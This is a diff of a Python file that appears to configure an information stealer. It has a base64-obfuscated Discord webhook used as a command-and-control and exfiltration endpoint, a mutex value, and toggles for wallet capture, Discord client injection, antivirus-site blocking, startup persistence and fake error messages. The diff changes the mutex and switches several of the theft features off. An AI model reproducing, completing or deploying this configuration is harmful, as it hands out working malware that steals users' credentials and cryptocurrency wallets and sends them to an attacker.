@@ -22,8 +22,8 @@ disable_warnings_urllib3()
 
 class Settings:
     C2 = (0, base64.b64decode('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMzMzI2NDQ0NjI2NDcwOTE4Mi9TWjdvanNBSU95cm42NmpEeU9fSDlTVmgweXNINGc4c2RJSVFjVnlGVVZrYzlfZndPNDVxdGw2MURDZ3dJV0M1TmtsVw==').decode())
-    Mutex = base64.b64decode('OU5LREF0eGNTa0lTYzhTdQ==').decode()
-    PingMe = bool('true')
+    Mutex = base64.b64decode('Rlpnb0tHcWMxSGlFUGM4RQ==').decode()
+    PingMe = bool('')
     Vmprotect = bool('')
     Startup = bool('')
     Melt = bool('')
@@ -44,10 +44,10 @@ class Settings:
     CaptureScreenshot = bool('')
     CaptureTelegram = bool('')
     CaptureCommonFiles = bool('')
-    CaptureWallets = bool('true')
+    CaptureWallets = bool('')
     FakeError = (bool(''), ('', '', '0'))
     BlockAvSites = bool('')
-    DiscordInjection = bool('true')
+    DiscordInjection = bool('')
 if not hasattr(sys, '_MEIPASS'):
     sys._MEIPASS = os.path.dirname(os.path.abspath(__file__))
 ctypes.windll.kernel32.SetConsoleMode(ctypes.windll.kernel32.GetStdHandle(-11), 7)
